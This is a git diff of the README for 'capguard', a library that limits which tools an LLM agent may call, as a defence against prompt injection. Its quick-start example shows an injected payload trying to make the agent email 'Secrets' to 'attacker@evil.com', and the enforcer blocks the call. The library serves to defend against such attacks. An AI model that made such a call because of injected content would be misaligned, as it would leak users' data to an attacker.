@@ -99,58 +99,107 @@ Even if the LLM is fully compromised → Unauthorized tools are **programmatical
 pip install capguard
 ```
 
-### 5-Minute Tutorial
+### Quick Start
 
+#### Option 1: Standard Usage (Vanilla Python)
+
+Use this if you are building your own agent loop with OpenAI, Groq, or Ollama.
+
+**Prerequisite:**
+```bash
+pip install "capguard[llm]"
+export GROQ_API_KEY="gsk_..."
+```
+
+**Code:**
 ```python
+import os
 from capguard import (
-    ToolRegistry,
-    create_tool_definition,
-    RuleBasedClassifier,
-    create_default_rules,
+    capguard_tool,
+    get_global_registry,
+    LLMClassifier,
     CapabilityEnforcer
 )
 
-# 1. Register your tools
-registry = ToolRegistry()
+# 1. Define your tools with decorators
+# The decorator automatically registers them!
 
-registry.register(
-    create_tool_definition(
-        name="read_website",
-        description="Fetch website content",
-        risk_level=2  # 1=safe, 5=critical
-    ),
-    func=your_read_website_function
+@capguard_tool(risk_level=2)
+def read_website(url: str):
+    """Fetch website content"""
+    return f"Content of {url}"
+
+@capguard_tool(risk_level=5)
+def send_email(to: str, content: str):
+    """Send an email"""
+    print(f"Sending email to {to}")
+
+# 2. Get the registry (auto-populated by decorators)
+registry = get_global_registry()
+
+# 3. Create classifier (using Groq for speed!)
+classifier = LLMClassifier(
+    registry, 
+    model="llama3-70b-8192",
+    base_url="https://api.groq.com/openai/v1",
+    api_key=os.environ["GROQ_API_KEY"]
 )
-
-registry.register(
-    create_tool_definition(
-        name="send_email",
-        description="Send email",
-        risk_level=4  # High risk!
-    ),
-    func=your_send_email_function
-)
-
-# 2. Create classifier (determines what tools are needed)
-classifier = RuleBasedClassifier(registry, create_default_rules())
-
-# 3. Create enforcer (blocks unauthorized tools)
 enforcer = CapabilityEnforcer(registry)
 
 # 4. User makes request
 user_request = "Summarize http://example.com"
 
 # 5. Classify BEFORE agent sees external content
+# This returns a token granting ONLY 'read_website'
 token = classifier.classify(user_request)
-# token.granted_tools = {"read_website": True, "send_email": False}
 
 # 6. Agent executes (with CapGuard enforcement)
+
 # ✓ This works:
-content = enforcer.execute_tool("read_website", token, url="http://example.com")
+enforcer.execute_tool("read_website", token, url="http://example.com")
 
 # ✗ This is BLOCKED (even if payload tricks the LLM):
-enforcer.execute_tool("send_email", token, to="attacker@evil.com", ...)
-# → Raises PermissionDeniedError
+try:
+    enforcer.execute_tool("send_email", token, to="attacker@evil.com", content="Secrets")
+except Exception as e:
+    print(f"Blocked: {e}")  # PermissionDeniedError
+```
+
+#### Option 2: LangChain Integration
+
+Use this if you already have a LangChain agent.
+
+**Prerequisite:**
+```bash
+pip install "capguard[langchain]"
+```
+
+**Code:**
+```python
+from langchain.tools import tool
+from capguard import capguard_tool, get_global_registry
+from capguard.integrations import ProtectedAgentExecutor
+
+# 1. Use BOTH decorators
+@tool
+@capguard_tool(risk_level=5)
+def send_email(to: str, content: str):
+    """Send an email"""
+    ...
+
+# 2. Create standard LangChain agent...
+agent = create_react_agent(...)
+agent_executor = AgentExecutor(agent=agent, tools=[send_email])
+
+# 3. Wrap it with CapGuard
+protected_agent = ProtectedAgentExecutor(
+    agent_executor=agent_executor,
+    registry=get_global_registry(),
+    classifier=classifier
+)
+
+# 4. Run safely
+protected_agent.invoke({"input": "Summarize..."})
 ```
 
 ### See It In Action (Docker Demo)
@@ -195,7 +244,7 @@ verify at http://localhost:8025 (MailHog UI).
 
 1. **Architectural Guarantee**: Even if LLM is compromised, tools are unavailable
 2. **Model-Agnostic**: Works with GPT, Claude, Llama, any LLM
-3. **Zero Dependencies**: Core library requires only Pydantic
+3. **Batteries Included**: Optional integration for LangChain and OpenAI
 4. **Production-Ready**: Full audit logging, constraint validation
 5. **Developer-Friendly**: 5 lines of code to get started
 
@@ -279,11 +328,11 @@ class MyClassifier(IntentClassifier):
 
 - [x] Core enforcement engine
 - [x] Rule-based classifier
-- [ ] Embedding-based classifier
-- [ ] LLM-based classifier
-- [ ] LangChain integration
+- [x] LLM-based classifier (OpenAI/Ollama)
+- [x] LangChain integration
+- [ ] Embedding-based classifier (Planned)
 - [ ] Dashboard for monitoring
-- [ ] Pre-trained classifiers
+- [ ] Tier 2 Fine-grained Constraints
 
 ---
 
